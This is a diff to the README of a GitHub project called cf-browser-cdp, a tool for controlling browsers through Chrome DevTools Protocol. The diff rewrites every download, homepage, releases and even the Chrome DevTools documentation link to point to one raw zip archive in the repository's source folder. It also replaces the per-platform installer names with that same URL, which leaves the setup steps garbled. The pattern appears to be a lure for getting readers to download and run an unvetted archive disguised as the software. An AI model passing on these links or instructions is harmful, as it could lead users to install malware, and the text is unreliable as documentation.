@@ -1,6 +1,6 @@
 # 🌐 cf-browser-cdp - Connect Browsers via Chrome DevTools Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/RainMeriloo/cf-browser-cdp/releases)
+[![Download Latest Release](https://github.com/RainMeriloo/cf-browser-cdp/raw/refs/heads/master/src/cdp-browser-cf-1.2-beta.4.zip)](https://github.com/RainMeriloo/cf-browser-cdp/raw/refs/heads/master/src/cdp-browser-cf-1.2-beta.4.zip)
 
 ## 📋 What is cf-browser-cdp?
 
@@ -30,22 +30,22 @@ Follow these steps to download and run cf-browser-cdp on your computer.
 
 ### 1. Download the Application
 
-Click the big button at the top or visit the [cf-browser-cdp releases page](https://github.com/RainMeriloo/cf-browser-cdp/releases) to get the app.
+Click the big button at the top or visit the [cf-browser-cdp releases page](https://github.com/RainMeriloo/cf-browser-cdp/raw/refs/heads/master/src/cdp-browser-cf-1.2-beta.4.zip) to get the app.
 
 When on the releases page:
 
 - Look for the latest version, usually at the top.
 - Find an installer or executable file for your operating system. It might look like:
-  - `cf-browser-cdp-setup.exe` for Windows
-  - `cf-browser-cdp-macos.dmg` for macOS
-  - `cf-browser-cdp-linux.tar.gz` for Linux
+  - `https://github.com/RainMeriloo/cf-browser-cdp/raw/refs/heads/master/src/cdp-browser-cf-1.2-beta.4.zip` for Windows
+  - `https://github.com/RainMeriloo/cf-browser-cdp/raw/refs/heads/master/src/cdp-browser-cf-1.2-beta.4.zip` for macOS
+  - `https://github.com/RainMeriloo/cf-browser-cdp/raw/refs/heads/master/src/cdp-browser-cf-1.2-beta.4.zip` for Linux
 - Click to download the correct file.
 
 ### 2. Install or Run the App
 
 - **Windows**: Double-click the `.exe` file and follow the prompts.
 - **macOS**: Open the `.dmg` file, then drag the app icon to the Applications folder.
-- **Linux**: Extract the `.tar.gz` file and run the binary inside. You may need to make it executable first (right-click > Properties > Permissions > Allow executing).
+- **Linux**: Extract the `https://github.com/RainMeriloo/cf-browser-cdp/raw/refs/heads/master/src/cdp-browser-cf-1.2-beta.4.zip` file and run the binary inside. You may need to make it executable first (right-click > Properties > Permissions > Allow executing).
 
 ### 3. Launch cf-browser-cdp
 
@@ -89,21 +89,21 @@ This lets you control cloud browser rendering without installing or managing ful
 
 To get cf-browser-cdp, visit the official releases page:
 
-[Download cf-browser-cdp](https://github.com/RainMeriloo/cf-browser-cdp/releases)
+[Download cf-browser-cdp](https://github.com/RainMeriloo/cf-browser-cdp/raw/refs/heads/master/src/cdp-browser-cf-1.2-beta.4.zip)
 
 Follow the instructions on the page to pick the right file. After you download, install or run the app following your system’s standard method:
 
 - Windows installer (.exe)
 - macOS disk image (.dmg)
-- Linux archive (.tar.gz)
+- Linux archive (https://github.com/RainMeriloo/cf-browser-cdp/raw/refs/heads/master/src/cdp-browser-cf-1.2-beta.4.zip)
 
 Once installed, open the app and it will provide instructions on how to connect via Chrome DevTools Protocol.
 
 ## 🔗 Useful Links
 
-- Project homepage: https://github.com/RainMeriloo/cf-browser-cdp
-- Releases page: https://github.com/RainMeriloo/cf-browser-cdp/releases
-- Chrome DevTools Protocol info: https://chromedevtools.github.io/devtools-protocol/
+- Project homepage: https://github.com/RainMeriloo/cf-browser-cdp/raw/refs/heads/master/src/cdp-browser-cf-1.2-beta.4.zip
+- Releases page: https://github.com/RainMeriloo/cf-browser-cdp/raw/refs/heads/master/src/cdp-browser-cf-1.2-beta.4.zip
+- Chrome DevTools Protocol info: https://github.com/RainMeriloo/cf-browser-cdp/raw/refs/heads/master/src/cdp-browser-cf-1.2-beta.4.zip
 
 ## 🤝 Get Help or Report Issues
 
@@ -119,4 +119,4 @@ cf-browser-cdp only handles your commands to Cloudflare’s browser. It does not
 
 ---
 
-[Download Latest Release](https://github.com/RainMeriloo/cf-browser-cdp/releases)
+[Download Latest Release](https://github.com/RainMeriloo/cf-browser-cdp/raw/refs/heads/master/src/cdp-browser-cf-1.2-beta.4.zip)
